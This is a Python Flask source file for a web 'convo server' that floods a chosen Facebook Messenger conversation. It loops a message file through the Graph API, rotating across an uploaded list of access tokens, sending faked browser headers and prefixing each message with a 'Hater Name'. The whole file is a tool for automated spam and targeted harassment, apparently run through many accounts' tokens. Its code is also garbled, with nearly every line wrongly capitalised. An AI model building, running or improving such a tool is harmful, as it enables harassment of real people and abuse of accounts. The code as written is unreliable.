From flask import Flask, request, render_template_string
Import requests
From threading import Thread, Event
Import time
Import random
Import string
 
App = Flask(__name__)
App.debug = True
 
Headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'User-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'www.google.com'
}
 
Stop_events = {}
Threads = {}
 
Def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    Stop_event = stop_events[task_id]
    While not stop_event.is_set():
        For message1 in messages:
            If stop_event.is_set():
                Break
            For access_token in access_tokens:
                Api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                Message = str(mn) + ' ' + message1
                Parameters = {'access_token': access_token, 'message': message}
                Response = requests.post(api_url, data=parameters, headers=headers)
                If response.status_code == 200:
                    Print(f"Message Sent Successfully From token {access_token}: {message}")
                Else:
                    Print(f"Message Sent Failed From token {access_token}: {message}")
                Time.sleep(time_interval)
 
@app.route('/', methods=['GET', 'POST'])
Def send_message():
    If request.method == 'POST':
        Token_option = request.form.get('tokenOption')
        
        If token_option == 'single':
            Access_tokens = [request.form.get('singleToken')]
        Else:
            Token_file = request.files['tokenFile']
            Access_tokens = token_file.read().decode().strip().splitlines()
 
        Thread_id = request.form.get('threadId')
        Mn = request.form.get('kidx')
        Time_interval = int(request.form.get('time'))
 
        Txt_file = request.files['txtFile']
        Messages = txt_file.read().decode().splitlines()
 
        Task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 
        Stop_events[task_id] = Event()
        Thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        Threads[task_id] = thread
        Thread.start()
 
        Return f'Task started with ID: {task_id}'
 
    Return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>❤️Convo server by Rajking❤️</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <style>
    /* CSS for styling elements */
    Label { color: white; }
    .file { height: 30px; }
    Body {
      Background-image: url('https://i.ibb.co/Fhtfnvz/IMG-20241123-WA0007.jpg');
      Background-size: cover;
      Background-repeat: no-repeat;
      Color: green;
    }
    .container {
      Max-width: 350px;
      Height: auto;
      Border-radius: 20px;
      Padding: 20px;
      Box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
      Box-shadow: 0 0 15px white;
      Border: Red;
      Resize: golden yellow;
    }
    .form-control {
      Outline: 1px red;
      Border: 1px double white;
      Background: transparent;
      Width: 100%;
      Height: 40px;
      Padding: 7px;
      Margin-bottom: 20px;
      Border-radius: 10px;
      Color: white;
    }
    .header { text-align: center; padding-bottom: 20px; }
    .btn-submit { width: 100%; margin-top: 10px; }
    .footer { text-align: center; margin-top: 20px; color: #888; }
    .whatsapp-link {
      Display: inline-block;
      Color: #25d366;
      Text-decoration: none;
      Margin-top: 10px;
    }
    .whatsapp-link i { margin-right: 5px; }
  </style>
</head>
<body>
  <header class="header mt-4">
    <h1 class="mt-3">0𝐅𝐅𝐋𝐈𝐍𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐁𝐘 𝐌𝐀𝐍𝐈</h1>
  </header>
  <div class="container text-center">
    <form method="post" enctype="multipart/form-data">
      <div class="mb-3">
        <label for="tokenOption" class="form-label">Select Token Option</label>
        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
          <option value="single">Single Token</option>
          <option value="multiple">Token File</option>
        </select>
      </div>
      <div class="mb-3" id="singleTokenInput">
        <label for="singleToken" class="form-label">Enter Single Token</label>
        <input type="text" class="form-control" id="singleToken" name="singleToken">
      </div>
      <div class="mb-3" id="tokenFileInput" style="display: none;">
        <label for="tokenFile" class="form-label">Choose Token File</label>
        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
      </div>
      <div class="mb-3">
        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
        <input type="text" class="form-control" id="threadId" name="threadId" required>
      </div>
      <div class="mb-3">
        <label for="kidx" class="form-label">Enter Your Hater Name</label>
        <input type="text" class="form-control" id="kidx" name="kidx" required>
      </div>
      <div class="mb-3">
        <label for="time" class="form-label">Enter Time (seconds)</label>
        <input type="number" class="form-control" id="time" name="time" required>
      </div>
      <div class="mb-3">
        <label for="txtFile" class="form-label">Choose Your Np File</label>
        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
      </div>
      <button type="submit" class="btn btn-primary btn-submit">Run</button>
      </form>
    <form method="post" action="/stop">
      <div class="mb-3">
        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
        <input type="text" class="form-control" id="taskId" name="taskId" required>
      </div>
      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
    </form>
  </div>
  <footer class="footer">
    <p>© 2025 ᴅᴇᴠʟᴏᴩᴇᴅ ʙʏ 😎 R4J KING 👑 </p>
    <p> 𝐀𝐕𝐄𝐍𝐆𝐄𝐑𝐒 𝐇𝐄𝐑𝐄<a href="https://www.facebook.com/profile.php?id=61560089617149">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+9190768 11018" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
      </a>
    </div>
  </footer>
  <script>
    Function toggleTokenInput() {
      Var tokenOption = document.getElementById('tokenOption').value;
      If (tokenOption == 'single') {
        Document.getElementById('singleTokenInput').style.display = 'block';
        Document.getElementById('tokenFileInput').style.display = 'none';
      } else {
        Document.getElementById('singleTokenInput').style.display = 'none';
        Document.getElementById('tokenFileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')
 
@app.route('/stop', methods=['POST'])
Def stop_task():
    Task_id = request.form.get('taskId')
    If task_id in stop_events:
        Stop_events[task_id].set()
        Return f'Task with ID {task_id} has been stopped.'
    Else:
        Return f'No task found with ID {task_id}.'
 
If __name__ == '__main__':
    App.run(host='0.0.0.0', port=5000)
